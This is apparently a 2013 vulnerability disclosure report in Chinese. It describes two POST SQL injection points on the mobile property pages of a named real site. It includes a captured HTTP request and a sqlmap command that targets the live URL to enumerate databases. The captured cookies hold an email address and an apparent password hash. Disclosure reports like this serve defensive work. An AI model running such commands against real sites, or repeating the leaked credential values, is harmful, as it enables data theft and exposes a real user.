wybug_title: 今题网某分站两枚post注入漏洞!
wybug_detail:
漏洞详情 披露状态：   									2013-11-13：	细节已通知厂商并且等待厂商处理中									2013-11-14：	厂商已经确认，细节仅向厂商公开									2013-11-24：	细节向核心白帽子及相关领域专家公开									2013-12-04：	细节向普通白帽子公开									2013-12-14：	细节向实习白帽子公开									2013-12-28：	细节向公众公开  简要描述： 今题网分站post注入! 详细说明：  昨天的礼物,虽然麻烦但是还是挺感谢管理员的.注入点：http://wap.jinti.com/fangchan/index.aspxhttp://wap.jinti.com/fangchan/wap_list_selloffice.aspx#1：抓包
POST /fangchan/index.aspx HTTP/1.1Host: wap.jinti.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://wap.jinti.com/fangchan/index.aspxCookie: __utma=47193788.682951190.1383889676.1383908244.1383963729.7; __utmz=47193788.1383901358.5.5.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=site%3Ajinti.com%20inurl%3Ajsp; Debug=Times=15; Login=IsLoggedIn=1; pgv_pvi=1247438848; __gads=ID=695e8a96dd069e51:T=1383896991:S=ALNI_Mbiizy9SsocyW7tbDKmBbu5qxQ2BQ; invitenum=5; membergame=userid=11150418&Email=1993401777@qq.com&password=7a1f45cd86473541727d47c96b0ad231; member=userid=11150418&Email=1993401777@qq.com&password=7a1f45cd86473541727d47c96b0ad231; ASP.NET_SessionId=5xf5qrjlpv0hju55e4qszvuq; __utmc=47193788Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 297__VIEWSTATE=%2FwEPDwULLTE2Nzc0NDk0MDVkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQlidG5zZWFyY2j24%2FkjCjf87fD0XTYngb1MWT3Cjw%3D%3D&txt_search=1&btnsearch.x=19&btnsearch.y=22&hareaid=&HiddenField1=&__EVENTVALIDATION=%2FwEWBQKQmujoCwKzwPf7DQKln%2FOLAgKvlfe3CgKQo8KrDfBCXDTK6KaOwIWuf7kPbxE26vGi
#2：报错

   漏洞证明：  #1：构建注入点
D:\Python27\sqlmap>sqlmap.py -u "http://wap.jinti.com/fangchan/index.aspx" --data "__VIEWSTATE=%2FwEPDwULLTE2Nzc0NDk0MDVkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQlidG5zZWFyY2j24%2FkjCjf87fD0XTYngb1MWT3Cjw%3D%3D&txt_search=1&btnsearch.x=49&btnsearch.y=6&hareaid=&HiddenField1=&__EVENTVALIDATION=%2FwEWBQKQmujoCwKzwPf7DQKln%2FOLAgKvlfe3CgKQo8KrDfBCXDTK6KaOwIWuf7kPbxE26vGi" --dbs
